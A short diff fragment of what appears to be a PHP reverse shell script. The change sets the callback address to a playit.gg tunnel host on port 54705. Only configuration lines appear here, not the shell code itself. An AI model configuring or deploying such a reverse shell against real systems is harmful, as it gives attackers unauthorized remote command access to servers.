@@ -5,7 +5,7 @@
 
   set_time_limit (0);
   $VERSION = "1.0";
-  $ip = 'beach.ryan.at.p';  // You have changed this
+  $ip = 'beach.ryan.at.playit.gg';  // You have changed this
   $port = 54705;  // And this
   $chunk_size = 1400;
   $write_a = null;
